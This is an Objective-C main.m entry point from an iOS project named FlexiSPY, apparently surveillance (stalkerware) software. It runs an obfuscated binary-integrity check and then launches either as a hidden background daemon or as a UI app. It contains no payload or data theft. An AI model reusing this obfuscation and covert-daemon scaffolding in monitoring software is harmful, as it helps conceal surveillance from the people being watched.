//
//  main.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import <UIKit/UIKit.h>

#import "AppEngine.h"

#import "FKMBGIIB6.h"

static NSString *kDaemonParam = @"ssmp-load-daemon";

int main(int argc, char *argv[]) {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    int retVal = 0;
	
	
	/* --------------------- Security Check ---------------- */
	
	FKMBGIIB6 *sMgr = [[FKMBGIIB6 alloc] init];
    [sMgr setCffos3:0];
    [sMgr setCffms3:512];
    
	BOOL binaryCorrupted = NO;
    
    if (![sMgr fcffe3]) {
        DLog(@"ifConfigFileExists = NO");
        binaryCorrupted = YES;
    }
	
    if (!binaryCorrupted && ![sMgr vetl3:@"." cfi:1]) {
        DLog(@"verifyExecutable = NO");
        binaryCorrupted = YES;
    }
    [sMgr release];
	
	DLog(@"Binary currupted = %d", binaryCorrupted);
	
	/* --------------------- Security Check ---------------- */
	
	if (!binaryCorrupted) {
//	if (1) {
		// Get parameter
		NSString *param = [NSString string];
		if (argc > 1) {
			param = [NSString stringWithCString:argv[1]
									   encoding:NSUTF8StringEncoding];
		}
		DLog(@"Launch parameter = %@", param);
		
		// Check parameter
		if ([param isEqualToString:kDaemonParam]) {
			// Start as daemon
			AppEngine *appEngine = [[AppEngine alloc] init];
			CFRunLoopRun();
			[appEngine release];
		} else {
			// Start as UI
			retVal = UIApplicationMain(argc, argv, nil, nil);
		}
	}
	
    [pool release];
    return retVal;
}
